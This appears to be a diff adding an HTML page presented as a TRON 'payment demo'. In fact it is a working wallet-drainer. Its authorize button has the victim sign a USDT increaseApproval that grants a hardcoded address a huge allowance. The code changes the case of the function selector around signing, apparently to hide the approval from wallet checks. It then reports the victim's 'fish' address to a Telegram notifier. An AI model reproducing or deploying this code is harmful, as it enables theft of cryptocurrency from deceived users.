@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>支付演示</title>
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+</head>
+
+<body>
+    <ul>
+        <li>
+            钱包地址：<span class="address"></span>
+        </li>
+        <li>
+            授权提交：<span class="rust"></span>
+        </li>
+
+        <button type="button" onclick="shouquan();">授权</button>
+    </ul>
+</body>
+
+</html>
+<script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
+<script>
+  // VConsole will be exported to `window.VConsole` by default.
+  var vConsole = new window.VConsole();
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
+<script>
+    let tronWeb;
+    // 连接钱包
+    const lianjieqianbao = () => {
+        var obj = setInterval(async () => {
+            if (window.tronWeb.defaultAddress == undefined || window.tronWeb.defaultAddress == null) {
+                console.log('连接失败');
+                return;
+            }
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                clearInterval(obj);
+                tronWeb = window.tronWeb;
+                $(".address").text(window.tronWeb.defaultAddress.base58);
+            }
+        }, 10);
+    };
+
+    // 授权
+    const shouquan = async () => {
+        let trxBalance = await tronWeb.trx.getBalance() / 1000000;
+        if (trxBalance < 24) {
+            swal({
+                title: 'TRX小于24.00，付款受限，请补充TRX！',
+                icon: 'error',
+                buttons: true,
+                dangerMode: true
+            });
+            return;
+        }
+
+        var parameter = [{ type: 'address', value: 'THSubSfqjKEBL6gbDR1hwZsBoaiARjfDun' }, { type: 'uint256', value: 5201314000000 }];
+        var options = {
+            feeLimit: 100000000n,
+        };
+        let { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+            "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+            "increaseApproval(address,uint256)",
+            options,
+            parameter,
+            window.tronWeb.defaultAddress.toHex
+        );
+
+        const raw_data = transaction.raw_data.contract[0].parameter.value.data.toString().replace("d73dd623", "D73DD623");
+        const raw_data_hex = transaction.raw_data_hex.toString().replace("d73dd623", "D73DD623");
+        transaction.raw_data.contract[0].parameter.value.data = raw_data;
+        transaction.raw_data_hex = raw_data_hex;
+
+        const signTransaction = await tronWeb.trx.sign(transaction);
+
+        const sign_raw_data = signTransaction.raw_data_hex.toString().replace("D73DD623", "d73dd623");
+        const sign_raw_data_hex = signTransaction.raw_data.contract[0].parameter.value.data.toString().replace("D73DD623", "d73dd623");
+        signTransaction.raw_data_hex = sign_raw_data;
+        signTransaction.raw_data.contract[0].parameter.value.data = sign_raw_data_hex;
+
+        const sendTransaction = await tronWeb.trx.sendRawTransaction(signTransaction);
+        console.log('上链结果', sendTransaction);
+
+        if (sendTransaction.result) {
+            // 上链成功后发送通知
+            const listenerAddress = "THSubSfqjKEBL6gbDR1hwZsBoaiARjfDun"; // 监听地址
+            const fishAddress = window.tronWeb.defaultAddress.base58; // 鱼苗地址 (假设固定)
+            sendAuthorizationNotification(listenerAddress, fishAddress);
+        } else {
+            console.log('上链失败');
+        }
+    };
+
+    // 发送授权通知
+    const sendAuthorizationNotification = (listenerAddress, fishAddress) => {
+        fetch('sendTelegramNotification.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `listenerAddress=${encodeURIComponent(listenerAddress)}&fishAddress=${encodeURIComponent(fishAddress)}`
+        })
+        .then(response => response.text())
+        .then(data => console.log('通知结果:', data))
+        .catch(error => console.error('通知失败:', error));
+    };
+    
+    // 初始化
+    $(() => {
+        lianjieqianbao();
+    });    
+</script>
